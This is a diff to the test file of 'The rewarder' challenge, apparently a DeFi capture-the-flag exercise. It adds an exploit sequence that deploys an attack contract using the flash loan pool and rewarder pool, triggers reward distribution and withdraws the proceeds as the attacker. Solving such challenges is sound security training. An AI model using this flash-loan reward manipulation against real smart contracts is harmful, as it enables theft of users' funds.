@@ -61,6 +61,20 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await time.increase(time.duration.days(5));
+
+        const HackTheRewarderPool = contract.fromArtifact('HackTheRewarderPool');
+        const hackContract = await HackTheRewarderPool.new(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address,
+            { from: attacker }
+        );
+
+        await hackContract.hackit({ from: attacker });
+        await this.rewarderPool.distributeRewards({ from: attacker });
+        await hackContract.withdraw({ from: attacker });
     });
 
     after(async function () {
